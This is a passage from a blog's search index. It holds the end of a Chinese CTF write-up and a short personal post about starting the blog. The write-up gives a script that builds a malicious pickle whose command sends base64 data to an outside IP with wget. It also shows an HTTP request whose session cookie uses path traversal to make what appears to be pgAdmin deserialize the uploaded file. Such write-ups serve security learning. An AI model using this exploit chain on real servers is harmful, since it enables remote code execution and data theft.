class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b<span class="string">&#x27;\x80\x04\x95&#x27;</span></span><br><span class="line">    b += struct.pack(<span class="string">&#x27;L&#x27;</span>, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b<span class="string">&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, len(platform)) + platform.encode()</span><br><span class="line">    b += b<span class="string">&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span></span><br><span class="line">    b += b<span class="string">&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b<span class="string">&#x27;\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="built_in">exit</span>(f<span class="string">&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;</span>)</span><br><span class="line">    HOST = <span class="string">&#x27;1.1.1.1:8000&#x27;</span></span><br><span class="line">    with open(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;posix&#x27;</span>, f<span class="string">&quot;wget http://121.40.98.237:7777 --post-data=`ls /usr/bin|base64|tr -d &#x27;\n&#x27;`&quot;</span>))</span><br></pre></td></tr></table></figure><p>运行上面的<code>pickler.py</code></p><p>得到posix.pickle文件后</p><p>登录web服务器，账号密码分别为<code>tacooooo@qq.com</code>/tacooooo`</p><p>点</p><p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=NzI5OGYyM2Y5ZmI1NzQ5OWI2OTc5MzE0MTlmYjM0YjNfaHkwWTdHbmxWS0JrNlltS2pNVlhwQTNBWENJbmRCdWJfVG9rZW46TlVFYWJYWHN4bzV3RVN4Z0xtMGN0YWRIbnc1XzE3MTEyOTU1MTM6MTcxMTI5OTExM19WNA" alt=""></p><p>将生成的posix.pickle文件上传</p><p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=MmExMWViZjkyNzQ5OWEwN2Q0NjU2MTFjMzMzYWQ0ZmZfSzAwbDROWE5Iamx0WDljS0s5NHE4THE0cHJsc3dENmRfVG9rZW46Q2ROT2JWaWFMb0lVaHB4ZlpyWmNQTVVWbmFiXzE3MTEyOTU1MTM6MTcxMTI5OTExM19WNA" alt=""></p><p>然后发送下面的数据包,就能执行命令了，看服务器对应的回显就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /browser/ HTTP/1.1</span><br><span class="line">Host: ee86fb88-5fd5-4f9c-9f6d-68b490e101d8.node.nkctf.yuzhian.com.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://9dbb3625-3439-4b7c-bea5-29ec33888059.node.nkctf.yuzhian.com.cn/login</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!a; PGADMIN_LANGUAGE=zh</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上周的TLS招新赛也出现了pickle反序列化，一直没找到时间真正学习，要把这个提上日程了</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>first blog</title>
      <link href="/2024/03/21/hello-world/"/>
      <url>/2024/03/21/hello-world/</url>
      
        <content type="html"><![CDATA[<h1>第一篇博客</h1><p>稍微记录一下，最开始本来没有搭建个人博客的想法的，以前不太清楚个人博客的定位是什么，因为如果不是大牛的话好像也没什么人看。但是上周几场比赛把自己打自闭了之后还是深刻地认识到了自己与大佬之间的差距，又燃起了许多学习的欲望。上学期的学习进度总是不太持续，一段时间猛猛学又一段毫无斗志，这次也是希望借由博客来帮助自己持续:<em>输入–&gt;输出</em> 这个过程吧，后面就把一些学习笔记记录上来，或许也会继续更一些生活学习的碎碎念哈哈哈</p><p>Anyway搭博客的过程虽然有点折腾，但是比起配CTF各种奇奇怪怪的脚本，工具的环境来说还是很简易了哈哈，基于githubpage的搭建也让我一个脚本纯靠CV大法的人学到一些github仓库的上传，管理操作.</p><p>过段时间比较有空了再慢慢捣鼓完善下网站的功能，这周的时间真的被榨干了，一堆作业和周末的比赛和web分享会</p><p>感谢搭建过程给予帮助的学长！</p><p>3500：<a href="https://huanxin-chen.github.io/">3500</a></p><p>顺虞：<a href="https://liu1272.github.io/about/">Robin</a></p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
